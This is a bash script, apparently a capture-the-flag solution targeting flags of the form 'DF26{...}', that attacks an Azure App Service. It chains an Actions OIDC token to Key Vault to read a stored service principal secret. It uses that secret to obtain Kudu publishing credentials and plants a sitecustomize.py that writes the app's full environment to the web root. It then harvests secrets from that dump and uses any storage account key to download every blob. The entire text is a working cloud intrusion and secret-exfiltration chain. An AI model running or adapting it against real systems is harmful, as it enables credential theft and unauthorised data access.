#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
TEN=$AZURE_TENANT_ID
MGMT="https://management.azure.com"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
ORIGIN="https://app-tbl-reporting-prod.azurewebsites.net"
API=2022-03-01
TAG="kx$(date +%s | tail -c 6)"
RES="kxenv_${TAG}.txt"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
RS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$(printf '%s' "$J"|jq -r .appId)" -d "client_secret=$(printf '%s' "$J"|jq -r '.clientSecret')" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
PUB=$(curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/config/publishingcredentials/list?api-version=$API")
U=$(printf '%s' "$PUB"|jq -r '.properties.publishingUserName'); P=$(printf '%s' "$PUB"|jq -r '.properties.publishingPassword')
A=(-u "$U:$P")
echo "TAG=$TAG kudu passlen=${#P}"

cat > /tmp/sc.py <<PY
import os, json
try:
    open("/home/site/wwwroot/${RES}","w").write("ENV="+json.dumps(dict(os.environ))+"\n")
except Exception as e:
    try: open("/home/site/wwwroot/${RES}","w").write("ERR %r\n"%e)
    except Exception: pass
PY
echo "payload bytes: $(wc -c </tmp/sc.py)"

echo "=== PUT sitecustomize.py (and app_data copies) ==="
for path in "site/wwwroot/sitecustomize.py"; do
  echo -n "  $path: "; curl -sS $M "${A[@]}" -X PUT --data-binary @/tmp/sc.py -H "If-Match: *" -o /dev/null -w "%{http_code}\n" "$SCM/api/vfs/$path"
done

echo "=== induce worker respawn by hitting origin ==="
for i in $(seq 1 12); do curl -sS $M -o /dev/null -w "%{http_code} " "$ORIGIN/?kx=$i" 2>/dev/null; curl -sS $M -o /dev/null -w "%{http_code} " "$ORIGIN/healthz" 2>/dev/null; done; echo

echo "=== poll for $RES ==="
GOT=""
for i in $(seq 1 12); do
  sleep 12
  R=$(curl -sS $M "${A[@]}" "$SCM/api/vfs/site/wwwroot/$RES" 2>/dev/null)
  if printf '%s' "$R" | grep -q "ENV="; then echo "GOT on try $i"; GOT="$R"; break; fi
  # keep knocking
  curl -sS $M -o /dev/null "$ORIGIN/?k=$i" 2>/dev/null; curl -sS $M -o /dev/null "$ORIGIN/api/v1/shipments" 2>/dev/null
done
[ -z "$GOT" ] && { echo "NO RESPAWN / no env file produced"; echo "EXECAPP DONE"; exit 0; }

echo "=== DF26 in app env? ==="; printf '%s' "$GOT" | grep -aoE "DF26\{[^}]*\}" && echo "*** FLAG ***"
echo "=== interesting env keys ==="
printf '%s' "$GOT" | sed 's/^ENV=//' | jq -r 'to_entries[]|"\(.key)=\(.value)"' 2>/dev/null | grep -aiE "flag|df26|config|storage|conn|secret|vault|account|key=|dojo|reporting|writer" | grep -aviE "SCM_|ORYX|WEBSITE_AUTH_(ENC|SIGN)|PATH=|LANG" | head -60

CONN=$(printf '%s' "$GOT" | sed 's/^ENV=//' | jq -r 'to_entries[].value' 2>/dev/null | grep -aiE "AccountKey=" | head -1)
if [ -n "$CONN" ]; then
  AN=$(printf '%s' "$CONN"|sed -nE 's/.*AccountName=([^;]+).*/\1/p'); AK=$(printf '%s' "$CONN"|sed -nE 's/.*AccountKey=([^;]+).*/\1/p')
  echo "=== config storage AccountName=$AN keylen=${#AK} ==="
  C=(--account-name "$AN" --account-key "$AK" --only-show-errors -o tsv); DL=/tmp/cfg; mkdir -p "$DL"
  for c in $(az storage container list "${C[@]}" --query '[].name' 2>/dev/null); do
    echo "  [container $c]"; for b in $(az storage blob list "${C[@]}" -c "$c" --query '[].name' 2>/dev/null); do
      az storage blob download "${C[@]}" -c "$c" -n "$b" -f "$DL/$(printf '%s' "$c/$b"|tr '/ ' '__')" >/dev/null 2>&1 || true; done
  done
  echo "  internal-config.json:"; find "$DL" -iname '*internal-config*' -exec cat {} \; 2>/dev/null | head -c 1500; echo
  echo "  DF26 in config storage:"; grep -raoE "DF26\{[^}]*\}" "$DL" 2>/dev/null | sort -u || echo "  (none)"
fi
echo "EXECAPP DONE"; exit 0
